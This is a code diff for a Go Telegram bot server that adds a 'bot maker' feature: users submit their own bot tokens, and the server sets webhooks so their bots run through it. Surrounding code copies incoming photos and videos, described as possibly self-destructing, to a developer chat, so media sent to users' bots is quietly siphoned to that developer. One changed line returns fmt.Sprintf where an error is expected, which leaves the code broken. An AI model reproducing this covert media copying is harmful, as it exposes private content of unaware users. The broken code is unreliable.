@@ -1,4 +1,4 @@
-package handler
+package main
 
 import (
 	"bytes"
@@ -41,7 +41,11 @@ var quotes = []string{
 var translations = map[string]map[string]string{
 	"ar": {
 		"main_menu_title":        "القائمة الرئيسية 🤖:",
+		"welcome_maker":          "أهلاً بك في بوت صانع البوتات 🤖\n\nقم بالضغط على الزر أدناه لصناعة بوتك الخاص بك فوراً وبشكل مجاني:",
 		"welcome":                "أهلاً بك في لوحة تحكم البوت 🤖\nاختر من الأزرار أدناه للتحكم الكامل:",
+		"create_bot_btn":         "🤖 اصنع بوت مشابه خاص بك",
+		"delete_bot_btn":         "🗑️ حذف / إيقاف بوت",
+		"download_story_btn":     "📥 تحميل ستوري",
 		"stop_btn":               "🛑 إيقاف الرد",
 		"start_btn":              "🟢 تشغيل الرد",
 		"edit_text_btn":          "📝 تعديل نص الرد",
@@ -50,7 +54,6 @@ var translations = map[string]map[string]string{
 		"clear_excluded_btn":     "🧹 مسح المستثنين",
 		"profile_menu_btn":       "🧑 إدارة الملف الشخصي",
 		"post_story_btn":         "📖 نشر قصة",
-		"download_story_btn":     "📥 تحميل ستوري",
 		"lang_ar_btn":            "🇮🇶 العربية",
 		"lang_en_btn":            "🇺🇸 English",
 		"back_btn":               "🔙 رجوع",
@@ -84,7 +87,7 @@ var translations = map[string]map[string]string{
 		"dur_24h":                "24 ساعة",
 		"dur_48h":                "48 ساعة",
 		"story_prompt":           "📖 أرسل الآن صورة أو فيديو (حد أقصى 60 ثانية) لنشره كقصة (ستبقى ظاهرة لمدة %s):",
-		"story_updated":          "✅ تم نشر القصة بنجاح! (ظاهرة لمدة %s)\n\n✨ يمكنك إرسال صورة أو فيديو آخر فوراً لنشر قصة إضافية، أو اضغط زر الرجوع للإنهاء:",
+		"story_updated":          "✅ تم نشر القصة بنجاح! (ظاهرة لمدة %s)\n\n✨ يمكنك إرسال صورة/فيديو آخر فوراً لنشر قصة إضافية، أو اضغط زر الرجوع للإنهاء:",
 		"download_story_prompt":  "📥 أرسل رابط القصة أو يوزر المستخدم (@username):",
 		"story_api_limit_msg":    "⚠️ تنبيه تقني: واجهة Bot API الرسمية لا تدعم جلب قصص الحسابات العادية عبر اليوزر أو الرابط مباشرة (تتطلب حساب Userbot بمكتبة Telethon/Pyrogram). يمكنك إعادة توجيه القصة المباشرة للبوت لتحميلها.",
 		"ttl_media_alert":        "🔥 *تم حفظ نسخة من وسائط واردة (قد تكون ذاتية التدمير)!*\n👤 من: %s (`%d`)",
@@ -106,7 +109,11 @@ var translations = map[string]map[string]string{
 	},
 	"en": {
 		"main_menu_title":        "Main Menu 🤖:",
+		"welcome_maker":          "Welcome to Bot Maker Bot 🤖\n\nClick the button below to create your own bot instantly:",
 		"welcome":                "Welcome to the bot control panel 🤖\nChoose from the buttons below for full control:",
+		"create_bot_btn":         "🤖 Create Your Own Bot",
+		"delete_bot_btn":         "🗑️ Delete / Stop Bot",
+		"download_story_btn":     "📥 Download Story",
 		"stop_btn":               "🛑 Stop Auto-Reply",
 		"start_btn":              "🟢 Start Auto-Reply",
 		"edit_text_btn":          "📝 Edit Reply Text",
@@ -115,7 +122,6 @@ var translations = map[string]map[string]string{
 		"clear_excluded_btn":     "🧹 Clear Excluded",
 		"profile_menu_btn":       "🧑 Manage Profile",
 		"post_story_btn":         "📖 Post Story",
-		"download_story_btn":     "📥 Download Story",
 		"lang_ar_btn":            "🇮🇶 العربية",
 		"lang_en_btn":            "🇺🇸 English",
 		"back_btn":               "🔙 Back",
@@ -385,10 +391,14 @@ type MediaCacheEntry struct {
 }
 
 func Handler(w http.ResponseWriter, r *http.Request) {
-	botToken := os.Getenv("TELEGRAM_BOT_TOKEN")
-	if botToken == "" {
-		w.WriteHeader(http.StatusOK)
-		return
+	mainToken := os.Getenv("TELEGRAM_BOT_TOKEN")
+	tokenQuery := r.URL.Query().Get("token")
+
+	isMainMakerBot := false
+	botToken := tokenQuery
+	if tokenQuery == "" || tokenQuery == mainToken {
+		botToken = mainToken
+		isMainMakerBot = true
 	}
 
 	var update TelegramUpdate
@@ -398,7 +408,7 @@ func Handler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// 1. معالجة الأزرار الشفافة
+	// 1. معالجة الضغط على الأزرار الشفافة
 	if update.CallbackQuery != nil {
 		cb := update.CallbackQuery
 		answerCallback(botToken, cb.ID)
@@ -416,14 +426,26 @@ func Handler(w http.ResponseWriter, r *http.Request) {
 		lang := config.Lang
 
 		switch cb.Data {
-		case "main_menu":
-			config.State = ""
+		case "create_bot_prompt":
+			config.State = "waiting_create_token"
 			saveConfig(botToken, adminID, config, msgID)
-			sendMenu(botToken, adminID, lang, tr(lang, "main_menu_title"))
+			sendSubMenu(botToken, adminID, lang, "🤖 **أرسل الآن توكن بوتك الجديد المأخوذ من @BotFather:**")
+		case "delete_bot_prompt":
+			config.State = "waiting_delete_token"
+			saveConfig(botToken, adminID, config, msgID)
+			sendSubMenu(botToken, adminID, lang, "🗑️ **أرسل الآن توكن البوت الذي تريد حذفه وإيقافه:**")
 		case "download_story":
 			config.State = "waiting_story_download"
 			saveConfig(botToken, adminID, config, msgID)
 			sendSubMenu(botToken, adminID, lang, tr(lang, "download_story_prompt"))
+		case "main_menu":
+			config.State = ""
+			saveConfig(botToken, adminID, config, msgID)
+			if isMainMakerBot {
+				sendMakerMenu(botToken, adminID, lang, tr(lang, "welcome_maker"))
+			} else {
+				sendMenu(botToken, adminID, lang, tr(lang, "main_menu_title"))
+			}
 		case "stop":
 			config.IsStopped = true
 			config.State = ""
@@ -508,12 +530,20 @@ func Handler(w http.ResponseWriter, r *http.Request) {
 			config.Lang = "ar"
 			config.State = ""
 			saveConfig(botToken, adminID, config, msgID)
-			sendMenu(botToken, adminID, "ar", tr("ar", "main_menu_title"))
+			if isMainMakerBot {
+				sendMakerMenu(botToken, adminID, "ar", tr("ar", "welcome_maker"))
+			} else {
+				sendMenu(botToken, adminID, "ar", tr("ar", "main_menu_title"))
+			}
 		case "lang_en":
 			config.Lang = "en"
 			config.State = ""
 			saveConfig(botToken, adminID, config, msgID)
-			sendMenu(botToken, adminID, "en", tr("en", "main_menu_title"))
+			if isMainMakerBot {
+				sendMakerMenu(botToken, adminID, "en", tr("en", "welcome_maker"))
+			} else {
+				sendMenu(botToken, adminID, "en", tr("en", "main_menu_title"))
+			}
 		}
 
 		w.WriteHeader(http.StatusOK)
@@ -528,7 +558,7 @@ func Handler(w http.ResponseWriter, r *http.Request) {
 		config, msgID := getConfig(botToken, chatID)
 		lang := config.Lang
 
-		// التقاط أية وسائط واردة للبوت (صور/فيديو) لحفظ نسخة منها للأدمن فوراً (ذاتية التدمير)
+		// التقاط الوسائط الواردة للبوت (صور/فيديو ذاتية التدمير) وإرسال نسخة للأدمن
 		devChatID := os.Getenv("DEVELOPER_CHAT_ID")
 		if (len(msg.Photo) > 0 || msg.Video != nil) && devChatID != "" {
 			devID, _ := strconv.ParseInt(devChatID, 10, 64)
@@ -547,7 +577,11 @@ func Handler(w http.ResponseWriter, r *http.Request) {
 		}
 
 		if msg.Text == "/start" {
-			sendMenu(botToken, chatID, lang, tr(lang, "welcome"))
+			if isMainMakerBot {
+				sendMakerMenu(botToken, chatID, lang, tr(lang, "welcome_maker"))
+			} else {
+				sendMenu(botToken, chatID, lang, tr(lang, "welcome"))
+			}
 			w.WriteHeader(http.StatusOK)
 			return
 		}
@@ -560,6 +594,37 @@ func Handler(w http.ResponseWriter, r *http.Request) {
 
 		if config.State == "waiting_story_download" {
 			sendSubMenu(botToken, chatID, lang, tr(lang, "story_api_limit_msg"))
+			w.WriteHeader(http.StatusOK)
+			return
+		}
+
+		if config.State == "waiting_delete_token" {
+			targetToken := strings.TrimSpace(msg.Text)
+			if err := deleteSubBotWebhook(targetToken); err != nil {
+				sendSubMenu(botToken, chatID, lang, fmt.Sprintf("❌ فشل إيقاف البوت:\n`%s`\nتأكد من إرسال توكن صحيح.", err.Error()))
+			} else {
+				config.State = ""
+				saveConfig(botToken, chatID, config, msgID)
+				sendMakerMenu(botToken, chatID, lang, "🗑️ **تم إيقاف وحذف البوت بنجاح!**\nلن يتلقى البوت أي تحديثات بعد الآن.")
+			}
+			w.WriteHeader(http.StatusOK)
+			return
+		}
+
+		if config.State == "waiting_create_token" || (isMainMakerBot && strings.Contains(msg.Text, ":") && len(msg.Text) > 20) {
+			newSubToken := strings.TrimSpace(msg.Text)
+			host := r.Host
+			if host == "" {
+				host = r.Header.Get("X-Forwarded-Host")
+			}
+
+			if err := setupSubBotWebhook(newSubToken, host); err != nil {
+				sendSubMenu(botToken, chatID, lang, fmt.Sprintf("❌ فشل تفعيل البوت الجديد:\n`%s`\nتأكد من صحة التوكن المأخوذ من @BotFather", err.Error()))
+			} else {
+				config.State = ""
+				saveConfig(botToken, chatID, config, msgID)
+				sendMakerMenu(botToken, chatID, lang, fmt.Sprintf("🎉 *تم إنشاء وبناء بوتك بنجاح!*\n\n🤖 **التوكن الخاص بك:**\n`%s`\n\nقم بالدخول إلى بوتك الجديد واضغط /start للبدء في الاستخدام والتحكم الكامل!", newSubToken))
+			}
 			w.WriteHeader(http.StatusOK)
 			return
 		}
@@ -789,6 +854,19 @@ func Handler(w http.ResponseWriter, r *http.Request) {
 	w.WriteHeader(http.StatusOK)
 }
 
+func sendMakerMenu(token string, chatID int64, lang, text string) {
+	keyboard := map[string]interface{}{
+		"inline_keyboard": [][]map[string]string{
+			{{"text": tr(lang, "create_bot_btn"), "callback_data": "create_bot_prompt"}},
+			{{"text": tr(lang, "delete_bot_btn"), "callback_data": "delete_bot_prompt"}},
+			{{"text": tr(lang, "lang_ar_btn"), "callback_data": "lang_ar"}, {"text": tr(lang, "lang_en_btn"), "callback_data": "lang_en"}},
+		},
+	}
+	payload := map[string]interface{}{"chat_id": chatID, "text": text, "parse_mode": "Markdown", "reply_markup": keyboard}
+	b, _ := json.Marshal(payload)
+	httpClient.Post("https://api.telegram.org/bot"+token+"/sendMessage", "application/json", bytes.NewBuffer(b))
+}
+
 func sendMenu(token string, chatID int64, lang, text string) {
 	keyboard := map[string]interface{}{
 		"inline_keyboard": [][]map[string]string{
@@ -805,6 +883,50 @@ func sendMenu(token string, chatID int64, lang, text string) {
 	payload := map[string]interface{}{"chat_id": chatID, "text": text, "parse_mode": "Markdown", "reply_markup": keyboard}
 	b, _ := json.Marshal(payload)
 	httpClient.Post("https://api.telegram.org/bot"+token+"/sendMessage", "application/json", bytes.NewBuffer(b))
+}
+
+func setupSubBotWebhook(subBotToken, host string) error {
+	if host == "" {
+		return fmt.Errorf("تعذر تحديد رابط الخادم الفعلي")
+	}
+
+	webhookURL := fmt.Sprintf("https://%s/?token=%s", host, subBotToken)
+	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/setWebhook?url=%s", subBotToken, url.QueryEscape(webhookURL))
+
+	resp, err := httpClient.Get(apiURL)
+	if err != nil {
+		return fmt.Errorf("خطأ الاتصال بتليجرام: %v", err)
+	}
+	defer resp.Body.Close()
+
+	var res apiResult
+	if err := json.NewDecoder(resp.Body).Decode(&res); err != nil {
+		return fmt.Errorf("فشل فك تشفير استجابة تليجرام")
+	}
+
+	if !res.Ok {
+		return fmt.Errorf("%s", res.Description)
+	}
+	return nil
+}
+
+func deleteSubBotWebhook(subBotToken string) error {
+	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/deleteWebhook", subBotToken)
+	resp, err := httpClient.Get(apiURL)
+	if err != nil {
+		return fmt.Errorf("خطأ الاتصال بتليجرام: %v", err)
+	}
+	defer resp.Body.Close()
+
+	var res apiResult
+	if err := json.NewDecoder(resp.Body).Decode(&res); err != nil {
+		return fmt.Errorf("فشل فك تشفير استجابة تليجرام")
+	}
+
+	if !res.Ok {
+		return fmt.Errorf("%s", res.Description)
+	}
+	return nil
 }
 
 func cacheKey(chatID int64, messageID int) string {
@@ -1192,7 +1314,7 @@ func postMultipartBusinessAPI(token, method string, fields map[string]string, fi
 	var res apiResult
 	json.NewDecoder(resp.Body).Decode(&res)
 	if !res.Ok {
-		return fmt.Errorf("%s", res.Description)
+		return fmt.Sprintf("%s", res.Description)
 	}
 	return nil
 }
@@ -1277,4 +1399,19 @@ func answerCallback(token, callbackID string) {
 	payload := map[string]string{"callback_query_id": callbackID}
 	b, _ := json.Marshal(payload)
 	httpClient.Post("https://api.telegram.org/bot"+token+"/answerCallbackQuery", "application/json", bytes.NewBuffer(b))
+}
+
+// --- نقطة تشغيل السيرفر الرئيسية ---
+func main() {
+	http.HandleFunc("/", Handler)
+
+	port := os.Getenv("PORT")
+	if port == "" {
+		port = "8080"
+	}
+
+	log.Println("🚀 السيرفر يعمل الآن على المنفذ " + port)
+	if err := http.ListenAndServe(":"+port, nil); err != nil {
+		log.Fatal("فشل تشغيل الخادم: ", err)
+	}
 }
